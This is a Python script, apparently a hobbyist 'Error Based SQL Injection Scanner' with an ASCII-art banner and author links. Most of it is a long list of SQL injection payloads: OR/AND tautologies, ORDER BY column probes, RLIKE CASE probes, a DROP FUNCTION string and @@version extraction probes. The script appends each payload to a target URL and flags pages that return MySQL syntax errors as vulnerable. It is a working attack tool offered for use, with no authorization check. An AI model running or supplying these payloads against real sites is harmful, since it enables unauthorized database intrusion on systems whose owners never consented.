import requests,datetime,argparse

from requests import get
from datetime import datetime
from argparse import ArgumentParser

def banner():
	print("""\033[4;32m
                   ckXWMMWXkc.
               'dKMMMMMMMMMMMMXd,
             cXMMMMMMMMMMMMMMMMMMNl
           'NMMMMMMMMMMMMMMMMMMMMMMN;
          lMMMMMMMMMMMMMMMMMMMMMMMMMMd
         cMMMMMMMMMMMMMMMMMMMMMMMMMMMMd
         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.
       .KX        KMMMMMMMMMMN        0X.
      .M:          ,MMMMMMMM:          ,M;
      NM            WMMMMMMM            WW
      OM            MMMMMMMM            MK
       NK          0MMMMMMMMK.         0M
        .Wx;.  .;xWMMMMMMMMMMWk;.  .;xW,
         OMMMMMMMMMMMMMMMMMMMMMMMMMMMMX
          MMMMMMMMMMMMMMMMMMMMMMMMMMMM
   ,xd   'WMMMMMMMMMMW    XMMMMMMMMMMM;   dx,
.oNMMMNdNMMMMMMMMMM.c'    .l MMMMMMMMMMNdXMMMNd.
.MMMMMMMMMMMMMMMMM.  Nx  oM   MMMMMMMMMMMMMMMMM'
  OMMMMMMMMMMMMMMM            WMMMMMMMMMMMMMMK
   ;MMMMMMMMM oMMM' '0o  :0: .MMMx MMMMMMMMMc
     WMMMMMMX  OMMMl'      .cWMMK  KMMMMMMM
      dMMMMMMl  .MMMWOoccokWMMM'  ;MMMMMMO
       .MMK        :MMMMMMMMl        OMM'
        ..             O0             .'\033[0m \033[1;41m Error Based SQL Injection Scanner \033[0m""")

arg = ArgumentParser(description=banner())
arg.add_argument("-u","--url",help="web vuln http://example.com/vuln.php?id=1",required=True)
arg.add_argument("-@","--author",help="Mr. Tom",required=False)
arg.add_argument("-g","--github",help="https://github.com/t0mxplo1t",required=False)
arg.add_argument("-y","--youtube",help="https://www.youtube.com/@termuxenthusiast",required=False)
parser = arg.parse_args()

url = parser.url

now = datetime.now()
time = now.strftime("\033[1;36m%H\033[0m:\033[1;36m%M\033[0m:\033[1;36m%S\033[0m")

payloads = [
" OR 1=1",
" OR 1=0",
" OR x=x",
" OR x=y",
" OR 1=1#",
" OR 1=0#",
" OR x=x#",
" OR x=y#",
" OR 3409=3409 AND ('pytW' LIKE 'pytW",
" OR 1=1--",
" OR 1=0--",
" OR x=x--",
" OR x=y--",
" OR 3709=3709 AND ('pytW' LIKE 'pytY",
" HAVING 1=1",
" HAVING 1=0",
" HAVING 1=1#",
" HAVING 1=0#",
" HAVING 1=1--",
" HAVING 1=0--",
" AND 1=1",
" AND 1=0",
" AND 1=1--",
" AND 1=0--",
" AND 1=1#",
" AND 1=0#",
" AND 1=1 AND '%'='",
" AND 1=0 AND '%'='",
" AND 1083=1083 AND (1427=1427",
" AND 7506=9091 AND (5913=5913",
" AND 1083=1083 AND ('1427=1427",
" AND 7506=9091 AND ('5913=5913",
" AND 7300=7300 AND 'pKlZ'='pKlZ",
" AND 7300=7300 AND 'pKlZ'='pKlY",
" AND 7300=7300 AND ('pKlZ'='pKlZ",
" AND 7300=7300 AND ('pKlZ'='pKlY",
" AS INJECTX WHERE 1=1 AND 1=1",
" AS INJECTX WHERE 1=1 AND 1=0",
" AS INJECTX WHERE 1=1 AND 1=1#",
" AS INJECTX WHERE 1=1 AND 1=0#",
" AS INJECTX WHERE 1=1 AND 1=1--",
" AS INJECTX WHERE 1=1 AND 1=0--",
" WHERE 1=1 AND 1=1",
" WHERE 1=1 AND 1=0",
" WHERE 1=1 AND 1=1#",
" WHERE 1=1 AND 1=0#",
" WHERE 1=1 AND 1=1--",
" WHERE 1=1 AND 1=0--",
" ORDER BY 1--",
" ORDER BY 2--",
" ORDER BY 3--",
" ORDER BY 4--",
" ORDER BY 5--",
" ORDER BY 6--",
" ORDER BY 7--",
" ORDER BY 8--",
" ORDER BY 9--",
" ORDER BY 10--",
" ORDER BY 11--",
" ORDER BY 12--",
" ORDER BY 13--",
" ORDER BY 14--",
" ORDER BY 15--",
" ORDER BY 16--",
" ORDER BY 17--",
" ORDER BY 18--",
" ORDER BY 19--",
" ORDER BY 20--",
" ORDER BY 21--",
" ORDER BY 22--",
" ORDER BY 23--",
" ORDER BY 24--",
" ORDER BY 25--",
" ORDER BY 26--",
" ORDER BY 27--",
" ORDER BY 28--",
" ORDER BY 29-- ",
" ORDER BY 30-- ",
" ORDER BY 31337--",
" ORDER BY 1#",
" ORDER BY 2#",
" ORDER BY 3#",
" ORDER BY 4#",
" ORDER BY 5#",
" ORDER BY 6#",
" ORDER BY 7#",
" ORDER BY 8#",
" ORDER BY 9#",
" ORDER BY 10#",
" ORDER BY 11#",
" ORDER BY 12#",
" ORDER BY 13#",
" ORDER BY 14#",
" ORDER BY 15#",
" ORDER BY 16#",
" ORDER BY 17#",
" ORDER BY 18#",
" ORDER BY 19#",
" ORDER BY 20#",
" ORDER BY 21#",
" ORDER BY 22#",
" ORDER BY 23#",
" ORDER BY 24#",
" ORDER BY 25#",
" ORDER BY 26#",
" ORDER BY 27#",
" ORDER BY 28#",
" ORDER BY 29#",
" ORDER BY 30#",
" ORDER BY 31337#",
" ORDER BY 1",
" ORDER BY 2",
" ORDER BY 3",
" ORDER BY 4",
" ORDER BY 5",
" ORDER BY 6",
" ORDER BY 7",
" ORDER BY 8",
" ORDER BY 9",
" ORDER BY 10",
" ORDER BY 11",
" ORDER BY 12",
" ORDER BY 13",
" ORDER BY 14",
" ORDER BY 15",
" ORDER BY 16",
" ORDER BY 17",
" ORDER BY 18",
" ORDER BY 19",
" ORDER BY 20",
" ORDER BY 21",
" ORDER BY 22",
" ORDER BY 23",
" ORDER BY 24",
" ORDER BY 25",
" ORDER BY 26",
" ORDER BY 27",
" ORDER BY 28",
" ORDER BY 29",
" ORDER BY 30",
" ORDER BY 31337",
" RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
" RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
" IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
" IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
" %' AND 8310=8310 AND '%'='",
" %' AND 8310=8311 AND '%'='",
" and (select substring(@@version,1,1))='X'",
" and (select substring(@@version,1,1))='M'",
" and (select substring(@@version,2,1))='i'",
" and (select substring(@@version,2,1))='y'",
" and (select substring(@@version,3,1))='c'",
" and (select substring(@@version,3,1))='S'",
" and (select substring(@@version,3,1))='X'"
]

try:
	if url:
		for payload in payloads:
			join = url+payload
			g = get(join)

			if "Error: You have an error in your SQL syntax" in g.text:
				print("["+time+"]"+" \033[1;92mvuln\033[0m",url+payload)
				ask = input("\033[1;33mTest the others [Y/n] \033[0m")

				if ask == "Y" or ask == "y":
					continue
				else:
					break

			else:
				print("["+time+"]"+" \033[9;91mnot vuln\033[0m",url+payload)

except KeyboardInterrupt:
	print("\033[9;91mYou clicked ctrl c\033[0m")
